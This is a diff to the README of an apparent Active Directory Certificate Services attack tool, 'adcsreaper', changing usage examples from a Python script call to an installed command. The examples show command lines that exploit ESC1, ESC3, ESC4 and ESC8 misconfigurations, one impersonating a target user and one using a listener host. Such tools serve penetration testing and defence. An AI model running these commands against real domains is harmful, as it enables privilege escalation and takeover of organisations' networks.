@@ -50,31 +50,31 @@ adcsreaper -h
 ## Usage
 ### Detection Only
 ```bash
-python3 adcsreaper.py -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -detect
+adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -detect
 ```
 
 ### Exploit ESC1
 ```bash
 # default Administrator
-python3 adcsreaper.py -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc1
+adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc1
 
 # custom target user
-python3 adcsreaper.py -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc1 -target-user Admin2
+adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc1 -target-user Admin2
 ```
 
 ### Exploit ESC3
 ```bash
-python3 adcsreaper.py -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc3
+adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc3
 ```
 
 ### Exploit ESC4
 ```bash
-python3 adcsreaper.py -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc4
+adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc4
 ```
 
 ### Exploit ESC8
 ```bash
-python3 adcsreaper.py -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc8 -lhost 192.168.1.5
+adcsreaper -domain domain.local -username admin -password 'Pass123' -dc-ip 10.10.10.1 -exploit -esc esc8 -lhost 192.168.1.5
 ```
 
 ## Logging
